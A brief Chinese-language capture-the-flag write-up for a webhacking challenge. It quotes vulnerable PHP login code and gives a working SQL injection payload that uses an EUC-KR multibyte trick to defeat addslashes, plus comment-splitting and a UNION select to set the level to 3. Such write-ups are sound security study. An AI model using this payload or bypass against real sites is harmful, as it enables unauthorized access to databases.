# old-50_450

* 這一題一進去的時候就可以看到斗大的標題 --- sql injection，以及 source code
    ```php=
    if($_GET['id'] && $_GET['pw']){
        $db = dbconnect();
        $_GET['id'] = addslashes($_GET['id']); 
        $_GET['pw'] = addslashes($_GET['pw']);
        $_GET['id'] = mb_convert_encoding($_GET['id'],'utf-8','euc-kr');
        foreach($_GET as $ck) if(preg_match("/from|pw|\(|\)| |%|=|>|</i",$ck)) exit();
        if(preg_match("/union/i",$_GET['id'])) exit();
        $result = mysqli_fetch_array(mysqli_query($db,"select lv from chall50 where id='{$_GET['id']}' and pw=md5('{$_GET['pw']}')"));
        if($result){
          if($result['lv']==1) echo("level : 1<br><br>");
          if($result['lv']==2) echo("level : 2<br><br>");
        } 
        if($result['lv']=="3") solve(50);
        if(!$result) echo("Wrong");
      }
    ```
    所以目標是把 lv 變成 3
* 看到這種兩邊都可以改動又看到非常討厭的 md5 的時候，可以用註解夾擊來化解
* 然後再看到這一行 `mb_convert_encoding($_GET['id'],'utf-8','euc-kr');`
    因為有經過 encoding 所以有極大可能性可以 encode 之後剩下 `'`
    可以參考一下這一篇[文章](https://websec.wordpress.com/2012/06/12/secuinside-ctf-writeup-sqlgeek/)
* 所以我產生了以下的 payload `?id=%bf%27/*&pw=*/union/**/select/**/3%23`
